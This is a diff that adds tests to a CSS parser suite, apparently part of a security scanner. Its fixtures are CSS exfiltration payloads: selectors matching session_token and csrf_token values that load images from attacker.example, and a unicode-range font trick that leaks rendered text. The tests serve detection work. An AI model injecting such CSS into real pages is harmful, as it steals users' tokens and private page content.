@@ -38,6 +38,12 @@ describe("CSS parser", () => {
 		expect(rules.some((rule) => rule.context.atRuleStack.includes("nested-style-rule") && rule.selector.includes("session_token"))).toBe(true);
 	});
 
+	it("retains late source-scanned nested security rules under large primary parser output", () => {
+		const cssText = `${Array.from({ length: 16_000 }, (_, index) => `.utility-${index}{display:block}`).join("\n")}\n.card{& input[name="session_token"][value*="abc"]{mask-image:url("https://attacker.example/nested-source-large")}}`;
+		const rules = parseCss(parserInput(cssText));
+		expect(rules.some((rule) => rule.context.atRuleStack.includes("nested-style-rule") && rule.selector.includes("session_token") && rule.declarationsText.includes("nested-source-large"))).toBe(true);
+	});
+
 	it("recovers malformed nested blocks and huge unmatched strings without throwing", () => {
 		const rules = parseCss(parserInput(`@media screen { .outer { color: red; input[name="csrf_token"][value^="a"] { background:url("https://attacker.example/nested") } ${"'".repeat(5000)}`));
 		expect(Array.isArray(rules)).toBe(true);
@@ -47,5 +53,13 @@ describe("CSS parser", () => {
 		const rules = parseCss(parserInput('@page{background-image:url("https://observer.example.test/page.svg")}'));
 		expect(rules.some((rule) => rule.selector === "@page" && rule.context.atRuleStack.some((entry) => /^@page\b/i.test(entry)))).toBe(true);
 	});
+
+	it("retains rendered-text and text-node rules in security-relevant source scanning", () => {
+		const cssText = `${".utility{display:block}\n".repeat(2000)}@font-face{font-family:"RenderedLeak";src:url("https://attacker.example/rendered.woff2");unicode-range:U+0041}.secret::first-line{font-family:"RenderedLeak";text-transform:uppercase}script{display:block;font-family:"RenderedLeak"}`;
+		const result = parseLargeStylesheetCssWithBudget(parserInput(cssText), { startedAt: 0, maxMs: 350, now: () => 0 });
+		expect(result.rules.some((rule) => rule.selector.includes("::first-line"))).toBe(true);
+		expect(result.rules.some((rule) => rule.selector === "script")).toBe(true);
+	});
+
 
 });
